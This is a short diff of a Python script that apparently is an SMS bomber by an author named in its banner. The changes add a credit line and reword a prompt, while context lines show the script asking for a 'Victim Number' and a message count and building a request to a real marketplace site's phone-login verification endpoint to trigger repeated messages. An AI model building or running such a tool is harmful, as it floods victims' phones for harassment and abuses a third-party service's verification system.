@@ -94,6 +94,7 @@ print ("""
    ║ AuTHor   : Vincenzo ツ          ║
    ║ FaCeBooK : omgVincenzo          ║
    ║ GitHuB   : omgVincenzo          ║
+   ║ Credit   : Rishad               ║
    ╚═════════════════════════════════╝
 
 
@@ -111,7 +112,7 @@ from requests.structures import CaseInsensitiveDict
 number  = str(input("[>] Enter Your Victim Number: "))
 
 
-amount = int(input("[>] How Many Massege (Max - Unlimite): "))
+amount = int(input("[>] How Many Massege You Want to Sent: "))
 
 url0 = "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone="+number+""
 
